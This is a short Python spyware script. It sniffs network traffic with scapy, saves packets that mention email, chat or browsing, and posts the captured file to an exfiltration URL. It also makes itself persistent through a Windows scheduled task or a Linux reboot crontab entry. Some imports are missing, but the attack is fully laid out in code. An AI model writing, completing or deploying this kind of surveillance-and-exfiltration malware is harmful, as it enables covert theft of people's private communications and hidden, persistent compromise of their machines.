from scapy.all import sniff, TCP, IP

def spyware_network_traffic_monitor(output_file: str, exfiltration_url: str) -> None:
    def packet_callback(packet):
        if packet.haslayer(TCP) and packet.haslayer(IP):
            payload = str(packet[TCP].payload)
            if "email" in payload.lower() or "chat" in payload.lower() or "browse" in payload.lower():
                with open(output_file, 'a') as f:
                    f.write(f"{packet[IP].src} -> {packet[IP].dst}: {payload}\n")
                try:
                    with open(output_file, 'r') as f:
                        data = f.read()
                    requests.post(exfiltration_url, data=data)
                except Exception as e:
                    print(f"Error sending data: {e}")

    def create_persistence():
        system = platform.system()
        if system == "Windows":
            service_name = "MonitorService"
            service_command = f'schtasks /create /tn "{service_name}" /tr "pythonw.exe -c import spyware; spyware.spyware_network_traffic_monitor(\'{output_file}\', \'{exfiltration_url}\')" /sc minute /mo 1'
            subprocess.run(service_command, shell=True)
        elif system == "Linux":
            service_name = "monitor"
            service_command = f'echo "@reboot python3 -c import spyware; spyware.spyware_network_traffic_monitor(\'{output_file}\', \'{exfiltration_url}\')" | crontab -'
            subprocess.run(service_command, shell=True)

    create_persistence()
    sniff(prn=packet_callback, store=0)

if __name__ == "__main__":
    output_file = "captured_data.txt"
    exfiltration_url = "http://example.com/exfiltrate"
    spyware_network_traffic_monitor(output_file, exfiltration_url)
